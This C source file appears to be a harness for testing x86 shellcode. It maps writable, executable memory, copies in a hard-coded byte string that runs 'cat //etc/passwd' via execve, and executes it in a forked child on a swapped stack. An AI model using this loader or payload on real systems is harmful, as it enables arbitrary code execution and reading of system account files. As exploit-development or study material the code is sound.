#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "compiler/compiler.h"
#include "regs/state.h"

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef SHADOW_STACK_SIZE
#define SHADOW_STACK_SIZE (1024 * 4)
#endif

int main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret, wstatus;
  pid_t pid;
  struct utsname uts;
  char *pcall;
  char *shadow_stack;
  char *thread_stack;
  char *shellcode = "\x33\xf6\x56\x68\x2f\x63\x61\x74"
                    "\x68\x2f\x62\x69\x6e\x68\x2f\x75"
                    "\x73\x72\x8b\xdc\x56\x68\x73\x73"
                    "\x77\x64\x68\x63\x2f\x70\x61\x68"
                    "\x2f\x2f\x65\x74\x8b\xcc\x56\x51"
                    "\x53\x8b\xd4\x56\x56\x52\x53\x33"
                    "\xc0\xb0\x3b\x50\xcd\x91";

  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (unlikely(pcall == MAP_FAILED)) {
    perror("mmap()");
    ret = -errno;
    goto __fallback;
  }

  shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));

  if (unlikely(!shadow_stack)) {
    perror("calloc()");
    ret = -errno;
    goto __must_unmap_payload;
  }

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    ret = -errno;
    goto __must_unmap_shadow_stack;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  printf("[*] Copying shellcode into crafted buffer..\n");
  memcpy(pcall, shellcode, strlen(shellcode));

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  printf("[*] Creating trivial sandbox..\n");

  pid = fork();

  if (unlikely(pid < 0)) {
    perror("fork()");
    ret = pid;
    goto __must_restore_regs;
  }

  if (likely(!pid)) {
    printf("[*] Saving thread stack..\n");
    __asm__ __volatile__("movl %%esp, %0\n" : "=r"(thread_stack));

#ifdef THREAD_DEBUG
    printf("[*] Debug\n");
    printf(" [*] thread_stack: %p\n", thread_stack);
    printf(" [*] shadow_stack: %p\n", shadow_stack);
#endif

    printf("[*] Installing shadow stack..\n");
    __asm__ __volatile__("movl %0, %%edi\n"
                         "xchgl %%edi, %%esp\n"
                         :
                         : "r"((unsigned long)shadow_stack));

    printf("[*] Executing the shellcode and performing stack restoration..\n");
    __asm__ __volatile__("call *%%eax\n"
                         "movl %0, %%edi\n"
                         "xchgl %%edi, %%esp\n"
                         :
                         : "r"((unsigned long)thread_stack), "a"(pcall));
  } else {
    waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
  }

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  printf("[*] Cleaning up..\n");
  free(shadow_stack);
  munmap(pcall, sysconf(_SC_PAGESIZE));

  return 0;

__must_restore_regs:
  store_regs(&__serialize_regs(cregs));

__must_unmap_shadow_stack:
  free(shadow_stack);

__must_unmap_payload:
  munmap(pcall, sysconf(_SC_PAGESIZE));

__fallback:
  return ret;
}
